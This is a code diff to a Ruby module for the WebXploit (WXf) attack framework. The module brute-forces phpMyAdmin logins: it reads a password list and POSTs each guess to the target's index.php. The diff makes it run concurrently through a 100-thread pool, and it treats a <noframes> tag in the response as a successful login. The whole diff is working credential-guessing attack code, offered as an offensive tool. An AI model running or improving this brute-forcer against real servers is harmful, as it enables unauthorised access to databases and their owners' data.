@@ -5,7 +5,7 @@
 
 class WebXploit < WXf::WXfmod_Factory::Auxiliary
 
- include WXf::WXfassists::General::MechReq
+ include WXf::WXfassists::General::PooledReq
   
   def initialize
       super(
@@ -28,6 +28,8 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
   end
   
   def run
+	# Create threadpool
+	pool = Pool.pool(size: 100)
 
 	username = datahash['USERNAME']
 
@@ -35,8 +37,37 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
 	fname = datahash['PASSLIST']
 	file = File.new(fname, "r")
 
+	response_action = Proc.new { |res,request_params, args |
+		username = args[0]
+		password = args[1]
+
+		# Scan request for <noframes></noframes>
+		# This appears in the source of a successfully authenticated session
+		frames = res.body.scan(/\<noframes\>(.*?)\<\/noframes\>/m)
+		
+		if frames.count > 0
+			print_good("#{username} : #{password}")
+			break
+		else
+			if datahash['VERBOSE'] == "true"
+				print_error("#{username} : #{password}")
+			end
+		end	
+	}
+
 	# Iterate over file contents
 	while (password = file.gets)
+		params = "pma_username=#{username}&pma_password=#{password}&server=1"
+		options = {
+            'method' => "POST",
+            'RURL'=> rurl + "/" + datahash['DIR'] + "/index.php",
+            'RPARAMS' => params,
+			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
+          }
+
+		pool.future.get(Proc.new {|opts| mech_req(opts)}, options, response_action, username, password) 
+
+=begin
 		params = "pma_username=#{username}&pma_password=#{password}&server=1"
 		
 		res = mech_req({
@@ -60,9 +91,9 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
 			end
 		end	
 
+=end
 	end
-
-
+	
   end
   
 end
